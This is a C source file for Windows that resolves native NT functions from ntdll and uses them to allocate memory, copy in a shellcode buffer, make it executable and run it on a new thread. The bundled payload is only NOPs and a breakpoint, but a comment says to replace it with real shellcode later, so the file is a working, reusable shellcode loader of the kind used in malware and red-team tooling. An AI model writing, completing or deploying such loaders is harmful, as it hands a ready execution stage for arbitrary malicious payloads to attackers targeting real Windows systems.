#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib") // native window library

// NTAPI functions
typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS(WINAPI* _NtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS(WINAPI* _NtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID,
    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// Sample shellcode (just a breakpoint for testing)
// Replace with real shellcode later
unsigned char shellcode[] =
"\x90\x90\x90\x90"  // nops
"\xCC";             // INT3

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)
        GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)
        GetProcAddress(ntdll, "NtProtectVirtualMemory");

    _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)
        GetProcAddress(ntdll, "NtCreateThreadEx");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {
        printf("Failed to load NTAPI functions.\n");
        return -1;
    }

    PVOID remoteBuffer = NULL;
    SIZE_T size = sizeof(shellcode);

    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &remoteBuffer,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        printf("Memory allocation failed: 0x%X\n", status);
        return -1;
    }

    memcpy(remoteBuffer, shellcode, sizeof(shellcode));

    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &remoteBuffer,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0) {
        printf("Memory protection failed: 0x%X\n", status);
        return -1;
    }

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("Thread creation failed: 0x%X\n", status);
        return -1;
    }

    printf("Shellcode running...\n");

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
